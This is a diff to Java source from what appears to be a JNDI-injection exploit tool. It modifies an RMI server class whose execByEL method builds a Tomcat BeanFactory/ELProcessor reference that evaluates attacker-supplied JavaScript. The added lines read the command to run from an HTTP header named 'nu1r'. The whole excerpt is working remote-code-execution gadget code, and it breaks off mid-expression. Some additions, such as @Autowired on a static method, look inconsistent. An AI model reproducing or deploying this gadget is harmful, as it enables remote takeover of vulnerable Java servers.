@@ -23,12 +23,12 @@ import java.rmi.server.ObjID;
 import java.rmi.server.RemoteObject;
 import java.rmi.server.UID;
 import java.util.Arrays;
-import java.util.Objects;
 
 import javax.naming.Reference;
 import javax.naming.StringRefAddr;
 import javax.net.ServerSocketFactory;
 import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
 
 import com.nu1r.jndi.utils.Config;
 import com.nu1r.jndi.gadgets.utils.Reflections;
@@ -36,6 +36,7 @@ import com.sun.jndi.rmi.registry.ReferenceWrapper;
 
 import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
 import org.apache.naming.ResourceRef;
+import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.web.context.request.RequestAttributes;
 import org.springframework.web.context.request.RequestContextHolder;
 import org.springframework.web.context.request.ServletRequestAttributes;
@@ -301,8 +302,15 @@ public class RMIServer extends InMemoryOperationInterceptor implements Runnable 
         Reflections.setFieldValue(rw, "wrappee", execByEL());
     }
 
+    @Autowired
     public static ResourceRef execByEL() {
-        ResourceRef        ref               = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
+
+        RequestAttributes requestAttributes = RequestContextHolder.getRequestAttributes();
+        HttpServletRequest  httprequest  = ((ServletRequestAttributes) requestAttributes).getRequest();
+        HttpServletResponse httpresponse = ((ServletRequestAttributes) requestAttributes).getResponse();
+
+        String cmd = httprequest.getHeader("nu1r");
+        ResourceRef                   ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
         ref.add(new StringRefAddr("forceString", "x=eval"));
         ref.add(new StringRefAddr("x", String.format(
                 "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(" +
